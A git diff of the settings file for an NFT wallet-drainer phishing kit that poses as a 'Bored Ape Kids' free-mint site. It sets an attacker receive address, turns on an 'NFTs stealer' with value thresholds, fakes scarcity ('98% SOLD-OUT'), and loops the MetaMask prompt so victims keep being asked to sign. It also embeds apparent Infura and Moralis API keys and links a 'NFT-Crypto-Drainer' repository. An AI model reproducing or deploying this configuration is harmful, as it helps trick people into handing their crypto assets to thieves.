@@ -1,51 +1,54 @@
-const receiveAddress = "0x28f630de17c2372b21Eb58b3F83b8215BAE85007";
+// ⚠️ for infura & moralis, make you sure that you copy same number of characters
+const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
+const infuraId = "52cf9376ca0149889215a557c6ef7c53"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "UFZFSHwkweXCj3FHGZHXxFITwXNVYgMog2wk5kq60hpmR2HFUxKt8Rz1uZQmbkE2"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
     name: "Bored Ape Kids",
+    title: "Bored Ape Kids", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    date: "28.06.2022",
     socialMedia: {
-        discord: "https://discord.com",
-        twitter: "https://twitter.com",
+        discord: "https://discord.gg/example",
+        twitter: "https://twitter.com/example",
     },
+    medias: {
+        preview: "preview.gif",
+        favicon: "logo.png",
+    },
+    background: {
+        type: "image",              // Supported types: image, video, color
+        image: "background.png",    // Image for image type, video preview for video type
+        video: "background.mp4",    // If you don't use video, you can ignore this line
+        color: "#FFF",           // If you don't use color, you can ignore this line
+    }
+}
+const mintInfo = {
+    price: 0,         // Price per NFT.
+    totalSupply: 10000,   // Total supply of NFTs.
+    minUnits: 1,        // Min units to buy.
+    maxUnits: 6,        // Max units to buy.
+    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
 }
 
-const indexPageInfo = {
-    backgroundImage: "background.jpg", // relative path to background image (in assets)
-    title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "FREE MINT",
-}
-
-const claimPageInfo = {
-    title: "FREE MINT", // <br> is a line break
-    shortDescription: "98% SOLD-OUT",
-    longDescription: "9832/10000 MINTED",
-
-    claimButtonText: "MINT NOW",
-
-    image: "bg.gif", // relative path to image (in assets)
-    imageRadius: 0, // image radius in px
-}
-
-const drainNftsInfo = {
+const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
+    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
+    receiveAddress: "" // leave empty if you want to use the same address 
 }
 
-const customStrings = {
-    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    connectButton: "Connect wallet",
-    transferButton: "Mint now",
-    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
-}
-
-/*
-    = = = = = END OF SETTINGS = = = = =
+/* 
+    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
 */
 
 //#region Check Configuration
-if (!receiveAddress.startsWith("0x") ||
+if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
+if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
+
+if (!address.startsWith("0x") ||
     (
-        receiveAddress.length >= 64 ||
-        receiveAddress.length <= 40
+        address.length >= 64 ||
+        address.length <= 40
     )
-) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
+) console.error(`Error: ${address} is not a valid Ethereum address.`);
+//#endregion
